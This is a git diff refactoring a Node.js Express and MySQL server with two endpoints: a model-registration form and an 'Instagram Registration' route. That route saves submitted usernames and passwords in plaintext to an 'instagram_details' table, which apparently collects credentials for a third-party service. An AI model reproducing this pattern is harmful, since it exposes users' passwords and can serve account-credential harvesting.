@@ -1,14 +1,13 @@
 import dotenv from "dotenv";
+import express from "express";
 import mysql from "mysql2";
-dotenv.config();
-
-import express, { json } from "express";
-import { createConnection } from "mysql2";
 import cors from "cors";
+
+dotenv.config();
 
 const app = express();
 app.use(cors());
-app.use(json());
+app.use(express.json());
 
 // MySQL connection
 const db = mysql.createConnection(process.env.DATABASE_URL);
@@ -21,11 +20,7 @@ db.connect(err => {
   }
 });
 
-export default db;
-
-/* -----------------------------------
-   1️⃣ Deyga Model Registration API
------------------------------------ */
+/* Model Registration */
 app.post("/api/register", (req, res) => {
   const { name, mobile, email, experience } = req.body;
 
@@ -33,23 +28,17 @@ app.post("/api/register", (req, res) => {
     return res.status(400).json({ message: "All fields required" });
   }
 
-  const sql = `
-    INSERT INTO model_registration (name, mobile, email, experience)
-    VALUES (?, ?, ?, ?)
-  `;
-
-  db.query(sql, [name, mobile, email, experience], err => {
-    if (err) {
-      console.error(err);
-      return res.status(500).json({ message: "Database error" });
+  db.query(
+    "INSERT INTO model_registration (name, mobile, email, experience) VALUES (?, ?, ?, ?)",
+    [name, mobile, email, experience],
+    err => {
+      if (err) return res.status(500).json({ message: "Database error" });
+      res.json({ message: "Saved" });
     }
-    res.json({ message: "Registration successful" });
-  });
+  );
 });
 
-/* -----------------------------------
-   2️⃣ Instagram-style Username + Email API
------------------------------------ */
+/* Instagram Registration */
 app.post("/api/instagram-register", (req, res) => {
   const { username, password } = req.body;
 
@@ -57,23 +46,17 @@ app.post("/api/instagram-register", (req, res) => {
     return res.status(400).json({ message: "All fields required" });
   }
 
-  const sql = `
-    INSERT INTO instagram_users (username, password)
-    VALUES (?, ?)
-  `;
-
-  db.query(sql, [username, password], err => {
-    if (err) {
-      console.error(err);
-      return res.status(500).json({ message: "Database error" });
+  db.query(
+    "INSERT INTO instagram_details (username, password) VALUES (?, ?)",
+    [username, password],
+    err => {
+      if (err) return res.status(500).json({ message: "Database error" });
+      res.json({ message: "Saved" });
     }
-    res.json({ message: "Saved successfully" });
-  });
+  );
 });
 
-// Start server
 const PORT = process.env.PORT || 3000;
-
 app.listen(PORT, () => {
-  console.log('🚀 Server running on port ${PORT}');
+  console.log("🚀 Server running on port ${PORT}");
 });
